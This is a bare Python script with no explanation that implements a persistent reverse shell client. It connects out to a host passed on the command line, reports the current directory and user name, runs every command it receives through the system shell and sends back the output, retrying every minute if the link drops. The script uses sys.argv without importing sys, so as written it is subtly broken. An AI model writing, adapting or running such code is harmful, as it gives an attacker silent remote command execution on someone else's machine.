import subprocess
import socket
import time
import os

HOST = sys.argv[1]
PORT = 8012
SIZE = 1024 * 128
SEP  = "<sep>"

while True:
    try:
        s = socket.socket()

        s.connect((HOST,PORT))

        cwd = os.getcwd()
        s.send(cwd.encode('utf-8'))
        s.send(os.getlogin().encode('utf-8'))
        while True:
            command = s.recv(SIZE).decode('utf-8')
            cmd = command.split()
            if cmd[0].lower() == 'cd':
                try:
                    os.chdir(' '.join(cmd[1:]))
                except FileNotFoundError as e:
                    out = str(e)
                else:
                    out = ''
            elif cmd[0].lower() == 'true':
                continue
            else:
                out = subprocess.getoutput(command)
            cwd = os.getcwd()
            s.send(f"{out}{SEP}{cwd}".encode('utf-8'))
    except:
        time.sleep(60)
